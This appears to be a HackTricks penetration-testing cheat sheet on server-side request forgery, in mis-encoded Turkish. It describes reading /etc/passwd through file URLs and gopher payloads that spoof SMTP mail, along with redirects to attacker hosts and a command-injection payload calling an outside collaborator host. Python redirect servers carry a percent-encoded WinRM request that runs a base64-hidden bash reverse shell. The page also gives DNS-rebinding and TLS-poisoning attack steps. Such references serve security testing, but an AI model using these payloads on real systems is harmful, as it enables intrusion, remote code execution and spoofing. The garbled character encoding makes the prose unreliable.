# SSRF (Sunucu TarafÄ± Ä°stek SahteciliÄŸi)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>


## Temel Bilgiler

**Sunucu TarafÄ± Ä°stek SahteciliÄŸi (SSRF)** zafiyeti, bir saldÄ±rganÄ±n bir **sunucu tarafÄ± uygulamasÄ±nÄ±** manipÃ¼le ederek kendi seÃ§tiÄŸi bir alan adÄ±na **HTTP istekleri** yapmasÄ±na neden olur. Bu zafiyet, saldÄ±rgan tarafÄ±ndan yÃ¶nlendirilen keyfi harici isteklere sunucuyu maruz bÄ±rakÄ±r.

## SSRF Yakalama

Ä°lk yapmanÄ±z gereken, tarafÄ±nÄ±zdan oluÅŸturulan bir SSRF etkileÅŸimini yakalamaktÄ±r. Bir HTTP veya DNS etkileÅŸimini yakalamak iÃ§in ÅŸu gibi araÃ§larÄ± kullanabilirsiniz:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - ngrok kullanan bir Burp Collaborator

## Beyaz Liste AlanlarÄ± Atlama

Genellikle SSRF'nin yalnÄ±zca **belirli beyaz liste alanlarÄ±nda** veya URL'de Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± bulacaksÄ±nÄ±z. AÅŸaÄŸÄ±daki sayfada, bu beyaz listeyi atlamak iÃ§in deneyebileceÄŸiniz tekniklerin bir **derlemesini** bulacaksÄ±nÄ±z:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### AÃ§Ä±k yÃ¶nlendirmeyi atlayarak

Sunucu doÄŸru ÅŸekilde korunuyorsa, web sayfasÄ±nÄ±n iÃ§indeki bir AÃ§Ä±k YÃ¶nlendirmeyi kullanarak **tÃ¼m kÄ±sÄ±tlamalarÄ± atlayabilirsiniz**. Web sayfasÄ±, **aynÄ± alan adÄ±na SSRF'ye izin verecek** ve muhtemelen **yÃ¶nlendirmeleri takip edecektir**, bu nedenle **AÃ§Ä±k YÃ¶nlendirmeyi kullanarak sunucunun iÃ§ kaynaklara eriÅŸmesini saÄŸlayabilirsiniz**.\
Daha fazlasÄ±nÄ± burada okuyun: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokoller

- **file://**
- `file://` URL ÅŸemasÄ±, doÄŸrudan `/etc/passwd`'e iÅŸaret eder: `file:///etc/passwd`

- **dict://**
- DICT URL ÅŸemasÄ±, DICT protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla tanÄ±mlamalara veya kelime listelerine eriÅŸmek iÃ§in kullanÄ±ldÄ±ÄŸÄ± belirtilir. Verilen bir Ã¶rnekte, belirli bir kelime, veritabanÄ± ve giriÅŸ numarasÄ±nÄ± hedefleyen oluÅŸturulmuÅŸ bir URL, saldÄ±rgan tarafÄ±ndan saÄŸlanan kimlik bilgilerini kullanarak bir DICT sunucusuna baÄŸlanmak iÃ§in potansiyel olarak kÃ¶tÃ¼ye kullanÄ±lan bir PHP betiÄŸi Ã¶rneklendirilir: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`

- **SFTP://**
- GÃ¼venli kabuk Ã¼zerinden gÃ¼venli dosya transferi iÃ§in bir protokol olarak tanÄ±mlanan SFTP, bir PHP betiÄŸinin kÃ¶tÃ¼ye kullanÄ±larak kÃ¶tÃ¼ niyetli bir SFTP sunucusuna baÄŸlanabileceÄŸi bir Ã¶rnek ile gÃ¶sterilir: `url=sftp://generic.com:11111/`

- **TFTP://**
- UDP Ã¼zerinden Ã§alÄ±ÅŸan Basit Dosya AktarÄ±m ProtokolÃ¼, bir PHP betiÄŸinin bir TFTP sunucusuna bir istek gÃ¶ndermek iÃ§in tasarlandÄ±ÄŸÄ± bir Ã¶rnekle belirtilir. 'TESTUDPPACKET' adlÄ± dosya iÃ§in 'generic.com' Ã¼zerinde '12346' portuna bir TFTP isteÄŸi yapÄ±lÄ±r: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`

- **LDAP://**
- Bu bÃ¶lÃ¼m, Hafif Dizin EriÅŸim ProtokolÃ¼'nÃ¼ kapsar ve IP aÄŸlarÄ± Ã¼zerinde daÄŸÄ±tÄ±lmÄ±ÅŸ dizin bilgi hizmetlerini yÃ¶netmek ve eriÅŸmek iÃ§in kullanÄ±mÄ±nÄ± vurgular. Localhost'ta bir LDAP sunucusuyla etkileÅŸim: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`

- **SMTP**
- SSRF zafiyetlerini kullanarak localhost'taki SMTP hizmetleriyle etkileÅŸimde bulunmak iÃ§in bir yÃ¶ntem aÃ§Ä±klanÄ±r. Bu bilgiler temelinde iÃ§ domain adlarÄ±nÄ± ortaya Ã§Ä±karmak ve daha fazla araÅŸtÄ±rma yapmak iÃ§in adÄ±mlar da aÃ§Ä±klanÄ±r.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- EÄŸer SSRF **curl** tarafÄ±ndan gerÃ§ekleÅŸtiriliyorsa, curl'Ã¼n [**URL globbing**](https://everything.curl.dev/cmdline/globbing) adÄ±nda bir Ã¶zelliÄŸi vardÄ±r ve bu Ã¶zellik WAF'larÄ± atlatmak iÃ§in kullanÄ±ÅŸlÄ± olabilir. Ã–rneÄŸin, bu [**yazÄ±da**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) `file` protokolÃ¼ Ã¼zerinden bir **yol geÃ§iÅŸi** Ã¶rneÄŸi bulabilirsiniz:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher protokolÃ¼nÃ¼n sunucu iletiÅŸimi iÃ§in IP, port ve baytlarÄ± belirleme yeteneÄŸi tartÄ±ÅŸÄ±lmaktadÄ±r. Gopherus ve remote-method-guesser gibi araÃ§lar, payload oluÅŸturmak iÃ§in kullanÄ±lmaktadÄ±r. Ä°ki farklÄ± kullanÄ±m Ã¶rneÄŸi aÅŸaÄŸÄ±da verilmiÅŸtir:

### Gopher://

Bu protokolÃ¼ kullanarak, sunucunun gÃ¶ndermesini istediÄŸiniz IP, port ve baytlarÄ± belirleyebilirsiniz. ArdÄ±ndan, temel olarak bir SSRF'yi sÃ¶mÃ¼rerek herhangi bir TCP sunucuyla iletiÅŸim kurabilirsiniz (ancak Ã¶nceden hizmetle nasÄ±l iletiÅŸim kuracaÄŸÄ±nÄ±zÄ± bilmelisiniz).\
Neyse ki, Ã§eÅŸitli hizmetler iÃ§in payload oluÅŸturmak iÃ§in [Gopherus](https://github.com/tarunkant/Gopherus) kullanabilirsiniz. AyrÄ±ca, _Java RMI_ hizmetleri iÃ§in _gopher_ payloadlarÄ± oluÅŸturmak iÃ§in [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) kullanÄ±labilir.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher HTTP is a technique used in Server-Side Request Forgery (SSRF) attacks. It involves exploiting the Gopher protocol to make HTTP requests from the vulnerable server to arbitrary destinations.

The Gopher protocol is a simple protocol used for retrieving and displaying documents over the Internet. It operates on port 70 and uses a hierarchical structure similar to URLs. By crafting a Gopher URL with an HTTP request as the payload, an attacker can trick the server into making unintended HTTP requests.

To perform a Gopher HTTP attack, an attacker needs to identify a vulnerable parameter that accepts URLs and is susceptible to SSRF. They can then construct a Gopher URL with the desired HTTP request as the payload. The Gopher URL is then passed as a parameter to the vulnerable application, which will make the unintended HTTP request.

This technique can be used to bypass network restrictions, access internal resources, or perform reconnaissance on the target network. It is important for developers to validate and sanitize user-supplied URLs to prevent SSRF attacks using Gopher HTTP.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP â€” 1337'e geri baÄŸlanma**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}


## Referrer baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla SSRF ve DiÄŸerleri

Sunuculardaki analitik yazÄ±lÄ±mlar genellikle gelen baÄŸlantÄ±larÄ± takip etmek iÃ§in Referrer baÅŸlÄ±ÄŸÄ±nÄ± kaydeder. Bu uygulamalarÄ±n yanlÄ±ÅŸlÄ±kla Server-Side Request Forgery (SSRF) zafiyetlerine maruz kalmasÄ±na neden olur. Bu, analitik araÃ§larÄ±n Referrer baÅŸlÄ±ÄŸÄ±nda belirtilen harici URL'leri ziyaret ederek yÃ¶nlendirme sitesi iÃ§eriÄŸini analiz etmesi nedeniyle gerÃ§ekleÅŸir. Bu zafiyetleri ortaya Ã§Ä±karmak iÃ§in Burp Suite eklentisi "**Collaborator Everywhere**" kullanÄ±lmasÄ± Ã¶nerilir. Bu eklenti, analitik araÃ§larÄ±n Referer baÅŸlÄ±ÄŸÄ±nÄ± nasÄ±l iÅŸlediÄŸini kullanarak potansiyel SSRF saldÄ±rÄ± yÃ¼zeylerini belirler.

## Sertifikadaki SNI verileri aracÄ±lÄ±ÄŸÄ±yla SSRF

Basit bir yapÄ±landÄ±rma ile herhangi bir arka uca baÄŸlantÄ±yÄ± etkinleÅŸtirebilecek bir yanlÄ±ÅŸ yapÄ±landÄ±rma, aÅŸaÄŸÄ±daki Nginx yapÄ±landÄ±rma Ã¶rneÄŸi ile gÃ¶sterilir:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Bu yapÄ±landÄ±rmada, Sunucu AdÄ± GÃ¶sterimi (SNI) alanÄ±ndaki deÄŸer doÄŸrudan arka uÃ§ adresi olarak kullanÄ±lÄ±r. Bu yapÄ±, Sunucu TarafÄ± Ä°stek SahteciliÄŸi'ne (SSRF) karÅŸÄ± bir zafiyet aÃ§Ä±ÄŸa Ã§Ä±karÄ±r ve istenen IP adresini veya alan adÄ±nÄ± SNI alanÄ±nda belirterek istismar edilebilir. `openssl` komutunu kullanarak `internal.host.com` gibi istenilen bir arka uca zorlamak iÃ§in bir istismar Ã¶rneÄŸi aÅŸaÄŸÄ±da verilmiÅŸtir:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget dosya yÃ¼kleme](../file-upload/#wget-file-upload-ssrf-trick)

## Komut Enjeksiyonu ile SSRF

`` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` `` gibi bir payload denemeye deÄŸer olabilir.

## PDF'lerin Render Edilmesi

Web sayfasÄ±, saÄŸladÄ±ÄŸÄ±nÄ±z bazÄ± bilgilerle otomatik olarak bir PDF oluÅŸturuyorsa, PDF oluÅŸturucu (sunucu) tarafÄ±ndan yÃ¼rÃ¼tÃ¼lecek olan bir JS kodu ekleyebilirsiniz ve SSRF'yi istismar edebilirsiniz. [**Daha fazla bilgiyi burada bulabilirsiniz**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF'den DoS'a

BirkaÃ§ oturum oluÅŸturun ve oturumlardan SSRF'yi istismar ederek aÄŸÄ±r dosyalarÄ± indirmeyi deneyin.

## SSRF PHP FonksiyonlarÄ±

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## SSRF YÃ¶nlendirmesi Gopher'a

BazÄ± istismarlar iÃ§in **bir yÃ¶nlendirme yanÄ±tÄ± gÃ¶ndermeniz gerekebilir** (muhtemelen gopher gibi farklÄ± bir protokol kullanmak iÃ§in). Ä°ÅŸte yÃ¶nlendirme ile yanÄ±t vermek iÃ§in farklÄ± python kodlarÄ±:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```
Bu kod parÃ§asÄ±, bir HTTP sunucusu oluÅŸturur ve 443 numaralÄ± portu dinler. `MainHandler` sÄ±nÄ±fÄ±nÄ± kullanarak gelen istekleri iÅŸler. `server.pem` dosyasÄ±nÄ± kullanarak SSL/TLS sertifikasÄ±yla sunucu soketini gÃ¼venli hale getirir. Son olarak, sunucu sÃ¼rekli olarak istekleri kabul eder ve iÅŸler.

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## DNS Rebidding CORS/SOP bypass

EÄŸer **CORS/SOP** nedeniyle bir yerel IP'den iÃ§erik Ã§Ä±karamÄ±yorsanÄ±z, **DNS Rebidding** bu kÄ±sÄ±tlamayÄ± aÅŸmak iÃ§in kullanÄ±labilir:

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### Otomatik DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity), [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§tÄ±r. SaldÄ±rÄ± sunucusunun DNS adÄ±nÄ±n IP adresini hedef makinenin IP adresine yeniden baÄŸlamak ve hedef makinedeki zayÄ±f yazÄ±lÄ±mlarÄ± sÃ¶mÃ¼rmek iÃ§in saldÄ±rÄ± yÃ¼klerini sunmak iÃ§in gerekli bileÅŸenleri iÃ§erir.

AyrÄ±ca [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html) adresinde **genel olarak Ã§alÄ±ÅŸan bir sunucuyu** kontrol edin.

## DNS Rebidding + TLS Session ID/Session ticket

Gereksinimler:

* **SSRF**
* **Giden TLS oturumlarÄ±**
* **Yerel baÄŸlantÄ± noktalarÄ±nda ÅŸeyler**

SaldÄ±rÄ±:

1. KullanÄ±cÄ±ya/bota **saldÄ±rgan tarafÄ±ndan kontrol edilen bir alan**a **eriÅŸim** isteyin.
2. **DNS**'nin **TTL** deÄŸeri **0** saniye olmalÄ±dÄ±r (bu nedenle kurban alanÄ±n IP'sini yakÄ±nda tekrar kontrol edecektir).
3. Kurban ve saldÄ±rgan alanÄ± arasÄ±nda bir **TLS baÄŸlantÄ±sÄ±** oluÅŸturulur. SaldÄ±rgan, **Session ID veya Session Ticket** iÃ§ine **payload'Ä± yerleÅŸtirir**.
4. **Alan**, **kendine karÅŸÄ± sonsuz bir yÃ¶nlendirme dÃ¶ngÃ¼sÃ¼** baÅŸlatacaktÄ±r. Bu, kullanÄ±cÄ±nÄ±n/botun alanÄ± eriÅŸmesini saÄŸlamak ve alanÄ±n **tekrar** bir **DNS isteÄŸi** gerÃ§ekleÅŸtirmesini saÄŸlamak iÃ§indir.
5. DNS isteÄŸinde **ÅŸimdi** bir **Ã¶zel IP** adresi verilir (Ã¶rneÄŸin 127.0.0.1).
6. KullanÄ±cÄ±/bot, **TLS baÄŸlantÄ±sÄ±nÄ± yeniden kurmaya** Ã§alÄ±ÅŸacak ve bunu yapmak iÃ§in **Session ID/Ticket ID**'yi gÃ¶nderecektir (saldÄ±rganÄ±n payload'unun bulunduÄŸu yer). Tebrikler, kullanÄ±cÄ±/botun **kendisine saldÄ±rmasÄ±nÄ± baÅŸardÄ±nÄ±z**.

Bu saldÄ±rÄ± sÄ±rasÄ±nda, localhost:11211 (_memcache_)'e saldÄ±rmak istiyorsanÄ±z, kurbanÄ±n ilk baÄŸlantÄ±yÄ± www.attacker.com:11211 ile kurmasÄ±nÄ± saÄŸlamanÄ±z gerekmektedir (port her zaman aynÄ± olmalÄ±dÄ±r).\
Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in ÅŸu aracÄ± kullanabilirsiniz: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
